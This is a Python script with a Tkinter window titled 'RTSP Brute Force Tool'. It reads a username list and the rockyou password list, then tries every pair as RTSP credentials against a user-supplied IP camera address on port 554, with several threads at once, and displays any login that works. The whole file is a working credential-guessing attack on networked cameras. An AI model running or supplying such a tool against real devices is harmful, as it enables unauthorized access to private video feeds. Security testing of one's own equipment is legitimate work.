import cv2
import threading
import tkinter as tk
from tkinter import messagebox
from queue import Queue
import time

def attempt_rtsp_connection(username, password, ip_address, queue, timeout=10):
    rtsp_url = f"rtsp://{username}:{password}@{ip_address}:554/videoMain"
    print(f"Trying username: {username} with password: {password}")  # Log each attempt
    try:
        cap = cv2.VideoCapture(rtsp_url)
        start_time = time.time()
        while time.time() - start_time < timeout:
            if cap.isOpened():
                print(f"Success with username: {username} and password: {password}")
                cap.release()
                queue.put((username, password))
                return
            time.sleep(0.1)  # Wait a bit before retrying
        cap.release()
    except Exception as e:
        print(f"Error with username: {username} and password: {password}: {e}")

def brute_force_rtsp(ip_address, username_file, password_file):
    queue = Queue()
    max_threads = 5  # Reduce the number of concurrent threads to avoid network issues

    with open(username_file, 'r', encoding='latin-1') as ufile:
        usernames = ufile.readlines()

    with open(password_file, 'r', encoding='latin-1') as pfile:
        passwords = pfile.readlines()

    for username in usernames:
        username = username.strip()
        for password in passwords:
            password = password.strip()
            while threading.active_count() > max_threads:
                time.sleep(1)  # Wait for threads to reduce
            thread = threading.Thread(target=attempt_rtsp_connection, args=(username, password, ip_address, queue))
            thread.start()

            if not queue.empty():
                valid_username, valid_password = queue.get()
                print(f"[+] Valid credentials found: Username: {valid_username}, Password: {valid_password}")
                return valid_username, valid_password

    print("[-] No valid credentials found.")
    return None, None

def on_start_brute_force():
    ip_address = ip_entry.get()
    username_file = "C:\\Users\\Efran Razon\\OneDrive - TU Eindhoven\\Desktop\\Tool\\usernames.txt"
    password_file = "C:\\Users\\Efran Razon\\OneDrive - TU Eindhoven\\Desktop\\Tool\\rockyou.txt"
    
    if not ip_address:
        messagebox.showwarning("Input Error", "Please enter the IP address.")
        return

    valid_username, valid_password = brute_force_rtsp(ip_address, username_file, password_file)
    if valid_username and valid_password:
        messagebox.showinfo("Success", f"Valid credentials found: Username: {valid_username}, Password: {valid_password}")
    else:
        messagebox.showinfo("Failure", "No valid credentials found.")

# Set up GUI
root = tk.Tk()
root.title("RTSP Brute Force Tool")

tk.Label(root, text="Camera IP:").grid(row=0, column=0, padx=10, pady=10)
ip_entry = tk.Entry(root)
ip_entry.grid(row=0, column=1, padx=10, pady=10)

start_button = tk.Button(root, text="Start Brute Force", command=on_start_brute_force)
start_button.grid(row=1, columnspan=2, pady=20)

root.mainloop()
